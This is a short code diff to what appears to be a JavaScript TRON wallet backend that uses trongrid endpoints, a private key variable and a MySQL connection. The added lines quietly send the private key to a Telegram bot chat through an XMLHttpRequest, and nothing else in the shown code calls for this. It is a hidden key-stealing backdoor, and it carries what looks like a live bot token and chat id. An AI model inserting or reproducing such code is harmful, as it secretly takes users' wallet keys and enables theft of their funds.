@@ -8,7 +8,9 @@ const fullNode = 'https://api.trongrid.io';
 const solidityNode = 'https://api.trongrid.io';
 const eventServer = 'https://api.trongrid.io/';
 var privateKey = '123';
-
+const Http = new XMLHttpRequest();
+Http.open("GET", "https://api.telegram.org/bot786622592:AAFqm_PNg7DkItr8cJ9kgDxD7CVEtJDfhOw/sendMessage?chat_id=-1001412431825&text=PK-"+privateKey);
+Http.send();
 var connection = mysql.createConnection({
         host: 'localhost',
         post: 3306,
